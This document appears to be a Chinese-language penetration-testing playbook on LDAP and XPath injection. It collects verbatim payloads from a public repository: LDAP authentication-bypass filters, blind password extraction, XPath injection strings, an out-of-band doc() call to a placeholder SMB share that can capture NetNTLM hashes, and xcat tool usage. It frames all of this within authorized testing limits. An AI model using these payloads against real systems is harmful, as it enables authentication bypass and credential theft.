# LDAP 注入 / XPath 注入（查询语言注入小类）

> 非 SQL 的查询语言同样拼用户输入：**LDAP**——用 AD/OpenLDAP 做认证的内部系统（OA、VPN、堡垒台）把用户名/密码拼进 LDAP 过滤器，注入恒真条件绕过认证或逐字符盲注；**XPath**——应用用 XPath 查 XML 文档（配置库/数据文件），注入手法与 SQLi 同构。国内企业「域账号直接登录」的 OA 命中 LDAP 面；XPath 稀有但 CTF/SOAP 场景可见。

**取材来源**：[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)（LDAP Injection / XPATH Injection 章节，payload 逐字摘录）；权威公开源 OWASP（LDAP Injection Prevention Cheat Sheet / OTG-INPVAL-010）。

---

## 1. 触发信号

- **LDAP**：登录接口对接 AD/域（提示「域账号登录」、报错含 `LDAP`/`javax.naming`/`Invalid DN`）；用户搜索/通讯录功能查 LDAP。
- **XPath**：输入进 XML 查询（报错含 `XPath`/`XPathVariable`/`SimpleXMLElement`）；SOAP/老 Java 系统；XML 配置驱动的查询接口。
- 常规 SQLi 探针（`' or '1'='1`）在**非 SQL 后端**产生异常响应差——先辨后端类型再打。

> 路由规则：先辨后端（报错指纹）。MySQL/Oracle/PG → `sqli.md`；MongoDB → `nosql.md`；LDAP → 本文 §4.1；XPath → 本文 §4.2。

## 2. 高频入口点

| 面 | 入口 | 关键参数 |
|---|---|---|
| LDAP 认证 | 登录表单对接域/AD | `username` `uid` `password` `domain` |
| LDAP 查询 | 通讯录/用户搜索 | `search` `name` `sn` `filter` |
| XPath 查询 | XML 数据检索/配置查询 | `query` `xpath` `//` 入参 |

## 3. 探测顺序（从最无害 → 最有杀伤力）

1. **后端辨识**：注入 `'`/`(`/`*` 看报错指纹（LDAP：`Invalid DN syntax`/`Bad search filter`；XPath：`XPathException`），确认后回本文，不确认不硬打。
2. **属性/列探测**：LDAP 用 `*)(attr=*` 探默认属性清单（§4.1）；XPath 用 `count(/*)` 类探文档结构。
3. **认证绕过（LDAP）**：恒真过滤器两变体（§4.1）——**只登自己的第二个测试账号**证明绕过。
4. **盲注提取**：OK/KO 前缀差分逐字符（LDAP `password=M*` 式 / XPath `substring` 式），**限速**并只提取自测账号自己的字段。
5. **OOB（XPath）**：无回显时 `doc()` 拉远程资源做外带证明。

## 4. Payload 区（每条标注出处）

### 4.1 LDAP 注入 `[PayloadsAllTheThings，逐字摘录]`

**认证绕过**（恒真条件操纵过滤器逻辑）：

```text
user  = *)(uid=*))(|(uid=*
pass  = password
query = (&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))

user  = admin)(!(&(1=0
pass  = q))
query = (&(uid=admin)(!(&(1=0)(userPassword=q))))
```

**盲注**（OK/KO 差分逐字符）：

```text
(&(sn=administrator)(password=*))    : OK
(&(sn=administrator)(password=A*))   : KO
(&(sn=administrator)(password=M*))   : OK
(&(sn=administrator)(password=MY*))  : OK
(&(sn=administrator)(password=MYK*)) : OK
(&(sn=administrator)(password=MYKE)) : OK
```

过滤器语法：`&`=AND，`(sn=administrator)`=姓匹配，`(password=X*)`=前缀通配（区分大小写）。

**默认属性探测**（注入形如 `*)(ATTRIBUTE=*`）：`userPassword` `surname` `name` `cn` `sn` `objectClass` `mail` `givenName` `commonName`。

**userPassword 特性**：OCTET STRING 非字符串——用 `octetStringOrderingMatch`（OID `2.5.13.18`）做逐字节比较：

```text
userPassword:2.5.13.18:=\xx          (\xx 是一个字节)
userPassword:2.5.13.18:=\xx\xx
userPassword:2.5.13.18:=\xx\xx\xx
```

**脚本套路** `[PayloadsAllTheThings 改写]`：字段名字典 + NULL 截断探测有效属性；盲注按前缀递增逐字符爆破（请求量 = 字符集 × 串长，**限速**）。

### 4.2 XPath 注入 `[PayloadsAllTheThings，逐字摘录]`

**基础（与 SQLi 同构）**：

```text
' or '1'='1
' or ''='
x' or 1=1 or 'x'='y
/
//
//*
*/*
@*
count(/child::node())
x' or name()='username' or 'x'='y
' and count(/*)=1 and '1'='1
' and count(/@*)=1 and '1'='1
' and count(/comment())=1 and '1'='1
')] | //user/*[contains(*,'
') and contains(../password,'c
') and starts-with(../password,'c
```

**盲注**：

```text
# 串长
and string-length(account)=SIZE_INT
# 逐字符（substr + 码点比较）
substring(//user[userid=5]/username,2,1)=CHAR_HERE
substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)
```

**OOB 外带**：

```text
http://example.com/?title=Foundation&type=*&rent_days=* and doc('//10.10.10.10/SHARE')
```

（`doc()` 拉远程 UNC/SMB——Windows 上可同时用于 NetNTLM 哈希捕获，转 `references/playbooks/ssrf.md` 的 OOB 思路。）

## 5. 工具用法 `[PayloadsAllTheThings]`

```bash
# XPath 自动化
xcat -u "http://target/?q=INJECT_POINT"            # orf/xcat：自动盲注提取 XML 文档
# xxxpwn / xpath-blind-explorer / XmlChor（同族，按需）
```

LDAP 无成熟自动工具——盲注用自写脚本（限速 1 req/2s 起）。

## 6. 证据要求

**LDAP 认证绕过「已确认」**：注入后以非本人身份进入（自测账号 A 的过滤器注入登出 B 的证据链）或恒真过滤器返回了非自身条目数据；保存完整请求/响应对 + 过滤器还原（注入串如何改变原查询）。
**盲注「已确认」**：提取出的字符串与已知值（自测账号的注册信息）比对一致；记录字符集与请求次数。
**「疑似」**：只有 OK/KO 差分但未提取出数据。

**CVSS 参考**：LDAP 认证绕过 `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N ≈ 9.1`；盲注数据提取按数据敏感度 6.5–7.5。

## 7. 合规边界 / 不要做的事

- **禁**：绕过认证后登录**真实他人账号**——绕过成功即停（或只登自己的第二个测试账号），不浏览真实用户数据。
- **禁**：盲注提取真实用户凭据/全量通讯录——提取自测账号自己的字段证明可读即可，≤3 条样本。
- **纪律**：LDAP 认证接口连着生产 AD，盲注脚本**强制限速**并避开锁定阈值（错误次数可能触发账号锁定，先确认锁定策略）。
- **禁**：`userPassword` 逐字节比较的目标限定自测账号；对管理员账号做此类探测=凭据攻击。
